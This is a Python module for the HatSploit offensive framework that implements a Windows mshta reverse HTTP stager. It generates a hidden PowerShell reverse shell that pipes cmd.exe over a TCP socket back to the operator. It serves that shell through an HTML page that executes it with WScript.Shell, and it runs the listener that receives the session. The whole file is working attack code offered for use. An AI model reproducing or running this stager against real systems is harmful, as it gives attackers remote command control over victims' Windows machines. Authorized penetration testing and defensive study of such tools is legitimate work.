#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

import threading

from hatsploit.lib.module import Module
from hatsploit.utils.handler import Handler
from hatsploit.utils.http import HTTPClient
from hatsploit.utils.tcp import TCPClient


class HatSploitModule(Module, Handler, HTTPClient, TCPClient):
    details = {
        'Name': "Windows Mshta Reverse HTTP Stager",
        'Module': "exploit/windows/stager/mshta_reverse_http",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer'
        ],
        'Description': "Windows mshta.exe reverse HTTP stager.",
        'Comments': [
            ''
        ],
        'Platform': "unix",
        'Risk': "high"
    }

    payload = {
        'Description': "Payload to use.",
        'Value': "windows/generic/powershell_reverse_tcp",
        'Categories': None,
        'Architectures': None,
        'Platforms': [
            'windows'
        ],
        'Types': None
    }

    options = {
        'SHOST': {
            'Description': "Host to start http server on.",
            'Value': TCPClient.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'SPORT': {
            'Description': "Port to start http server on.",
            'Value': 8080,
            'Type': "port",
            'Required': True
        },
        'SRVHOST': {
            'Description': "Local host to listen on.",
            'Value': "0.0.0.0",
            'Type': "ip",
            'Required': True
        },
        'SRVPORT': {
            'Description': "Local port to listen on.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        },
        'FOREVER': {
            'Description': "Start listener forever.",
            'Value': "no",
            'Type': "boolean",
            'Required': False
        }
    }

    def generate_payload(self, local_host, local_port):
        source = (
            f"$a='{local_host}';"
            f"$b={local_port};"
            "$c=New-Object system.net.sockets.tcpclient;"
            "$nb=New-Object System.Byte[] $c.ReceiveBufferSize;"
            "$ob=New-Object System.Byte[] 65536;"
            "$eb=New-Object System.Byte[] 65536;"
            "$e=new-object System.Text.UTF8Encoding;"
            "$p=New-Object System.Diagnostics.Process;"
            "$p.StartInfo.FileName='cmd.exe';"
            "$p.StartInfo.RedirectStandardInput=1;"
            "$p.StartInfo.RedirectStandardOutput=1;"
            "$p.StartInfo.RedirectStandardError=1;"
            "$p.StartInfo.UseShellExecute=0;"
            "$q=$p.Start();"
            "$is=$p.StandardInput;"
            "$os=$p.StandardOutput;"
            "$es=$p.StandardError;"
            "$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);"
            "$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);"
            "$c.connect($a,$b);"
            "$s=$c.GetStream();"
            "while ($true) {"
            "start-sleep -m 100;"
            "if ($osread.IsCompleted -and $osread.Result -ne 0) {"
            "$r=$os.BaseStream.EndRead($osread);"
            "$s.Write($ob,0,$r);"
            "$s.Flush();"
            "$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);"
            "}"
            "if ($esread.IsCompleted -and $esread.Result -ne 0) {"
            "$r=$es.BaseStream.EndRead($esread);"
            "$s.Write($eb,0,$r);"
            "$s.Flush();"
            "$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);"
            "}"
            "if ($s.DataAvailable) {"
            "$r=$s.Read($nb,0,$nb.Length);"
            "if ($r -lt 1) {"
            "break;"
            "} else {"
            "$str=$e.GetString($nb,0,$r);"
            "$is.write($str);"
            "}"
            "}"
            "if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) {"
            "break;"
            "}"
            "if ($p.ExitCode -ne $null) {"
            "break;"
            "}"
            "}"
        )

        payload = f"powershell -w hidden -nop -c {source}"
        return payload

    def run(self):
        server_host, server_port, local_host, local_port, forever = self.parse_options(self.options)

        payload = f"<html><head><script>var c= \"{self.generate_payload(server_host, local_port)}\"\n"
        payload += "new ActiveXObject('WScript.Shell').Run(c);</script></head><body><script>self.close();</script></body></html>"

        thread = threading.Thread(
            target=self.start_server,
            args=[
                server_host,
                server_port,
                payload,
                True if forever.lower() in ['yes', 'y'] else False
            ]
        )
        thread.start()

        if forever.lower() in ['yes', 'y']:
            while True:
                status = self.handle_session(
                    host=local_host,
                    port=local_port,
                    payload=self.payload,
                    method="reverse_tcp",
                    timeout=None
                )

                if not status:
                    return
        else:
            self.handle_session(
                host=local_host,
                port=local_port,
                payload=self.payload,
                method="reverse_tcp",
                timeout=None
            )

        thread.join()
